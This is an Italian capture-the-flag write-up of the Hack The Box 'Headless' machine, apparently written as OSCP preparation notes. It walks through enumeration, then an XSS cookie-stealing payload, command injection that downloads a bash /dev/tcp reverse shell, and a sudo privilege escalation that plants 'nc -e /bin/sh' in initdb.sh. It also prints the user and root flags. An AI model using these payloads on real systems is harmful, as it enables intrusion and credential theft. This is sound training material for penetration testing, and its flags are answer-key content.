**TARGET: 10.10.11.8**

# INFORMATION GATHERING 

Lanciamo un primo scan con [Nmap](Note/Tool/Nmap.md)

```shell-session
┌──(root㉿kali)-[/home/kali/htb]
└─# nmap -sTVC 10.10.11.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-06 14:27 CEST
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 14:29 (0:01:13 remaining)
Nmap scan report for 10.10.11.8
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Thu, 06 Jun 2024 12:27:38 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest:
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=6/6%Time=6661AB37%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x
SF:20Python/3\.11\.2\r\nDate:\x20Thu,\x2006\x20Jun\x202024\x2012:27:38\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zf
SF:s;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x
SF:20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x
SF:20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-widt
SF:h,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Constructi
SF:on</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20bo
SF:dy\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x
SF:20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20dis
SF:play:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify
SF:-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20a
SF:lign-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x200
SF:,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYPE
SF:\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x2
SF:0\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20respo
SF:nse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20versi
SF:on\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x
SF:20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x2
SF:0unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.79 seconds
```

Abbiamo un 2 porte aperte

- 22/tcp     ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
- 5000/tcp  

Visitiamo 10.10.11.9:5000
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/haedless.png)
nel frattempo utilizziamo [Gobuster](Note/Tool/Gobuster.md) per enumerare le directory

```shell-session
┌──(kali㉿kali)-[~/htb]
└─$ gobuster dir -u http://10.10.11.8:5000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.8:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/support              (Status: 200) [Size: 2363]
/dashboard            (Status: 500) [Size: 265]
```

Troviamo `/support` e `dashboard`
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Haedless1.png)

Ho cercato online come rubare i cookie usando XSS e ho trovato [questa pagina](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e) dove vedo quanto segue: 
>- Cookie Stealing
  (Note: HttpOnly should not be enabled/present in cookie header)
  `<script>var i=new Image(); i.src="====[http://10.10.14.8/?cookie=](http://10.10.14.8/?cookie=)===="+btoa(document.cookie);</script>`
  Here we have used btoa() method for converting the cookie string into base64 encoded string.

Seguendo quanto riportato dell'articolo tiriamo su un server python per la cattura del cookie.


```
┌──(root㉿kali)-[/home/kali]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Dopo varie prove troviamo che il campo vulnerabile alla XSS è `User-Agent`

```
┌──(root㉿kali)-[/home/kali]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.8 - - [06/Jun/2024 22:53:19] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
```

Come suggeriva l'articolo di medium il cookie che ricaviamo e codificato in base64 non ci resta che decodificarlo 

```bash
┌──(root㉿kali)-[/home/kali]
└─# echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

Visitiamo la pagina `dashboard` sostituendo il valore del cookie.
Abbiamo cosi acceso alla dashboard dell'admin

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/haedless3.png)

Da qui dobbiamo valutare quali opzioni abbiamo. Sembra che il campo della data richieda l'input dell'utente, che è dove di solito mi piace guardare. Ora che siamo dietro una pagina protetta possiamo provare a procurarci una shell? Proviamoci. Creo un file chiamato payload.sh con quanto segue al suo interno.

```bash
┌──(root㉿kali)-[/home/kali/htb/haedless]
└─# cat payload.sh
/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.20/1111 0>&1;'
```

tiriamo su un server python per far scaricare il nostro payload.

```bash
┌──(root㉿kali)-[/home/kali/htb/haedless]
└─# python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
```

ci mettiamo anche in ascolto con nc per ricevere la shell.

```bash
┌──(root㉿kali)-[/home/kali/htb/haedless]
└─# nc -nlvp 1111
listening on [any] 1111 ...
```

Torna su /dashboard e premiamo "Genera report" e catturiamo la richiesta con Burp. Vogliamo inserire un comando che recupererà il file payload che abbiamo creato e lo eseguirà. Assicurandoci di avere il cookie di amministrazione elencato nel campo dei cookie.
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/haedless4.png)

il payload viene scaricato 

```bash
┌──(root㉿kali)-[/home/kali/htb/haedless]
└─# python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.11.8 - - [06/Jun/2024 23:19:03] "GET /payload.sh HTTP/1.1" 200 -
```

ed eseguito dandoci la nostra shell.

```bash
┌──(root㉿kali)-[/home/kali/htb/haedless]
└─# nc -nlvp 1111
listening on [any] 1111 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.8] 41540
bash: cannot set terminal process group (1378): Inappropriate ioctl for device
bash: no job control in this shell
dvir@headless:~/app$ id
id
uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)

```

facciamo upgrade della shell e ci andiamo a prendere la nostra prima flag

```bash
dvir@headless:~$ ls
app  geckodriver.log  user.txt
dvir@headless:~$ cat user.txt
2307a4a2772d10319c5a17ad27f75c86
```

# PRIVESC

Una delle prime cose che faccio di solito e vedere se possiamo eseguire qualcosa con i privilegi root e per farlo utilizziamo il comando `sudo -l`

```bash
dvir@headless:~$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
dvir@headless:~$
```

Bene abbiamo il file `/usr/bin/syscheck` andiamo a vedere di cosa si tratta.

```bash
dvir@headless:~$ cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
dvir@headless:~$
```

Vediamo che il file initdb.sh viene avviato, quindi ciò che possiamo fare è provare ad inserire un payload in quel file.

prepariamo il nostro pyaload
```bash
dvir@headless:~$ cat initdb.sh
nc -e /bin/sh 10.10.14.20 1212
```

ci prepariamo mettendoci in ascolto con un nuovo nc
```bash
┌──(root㉿kali)-[/home/kali/htb/haedless]
└─# nc -nlvp 1212
listening on [any] 1212 ...
```

ed eseguiamo `sudo /usr/bin/syscheck`
```bash
    (ALL) NOPASSWD: /usr/bin/syscheck
dvir@headless:~$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.9G
System load average:  0.00, 0.01, 0.00
Database service is not running. Starting it...
```

otteniamo cosi la nostra shell.

```bash
┌──(root㉿kali)-[/home/kali/htb/haedless]
└─# nc -nlvp 1212
listening on [any] 1212 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.8] 54188
id
uid=0(root) gid=0(root) groups=0(root)
```

Facciamo sempre un upgrade dell shell e ci prendiamo la nostra root flag

```bash
root@headless:~# cat root.txt
94af7231100ef5d7240e9a491ecaed7f
```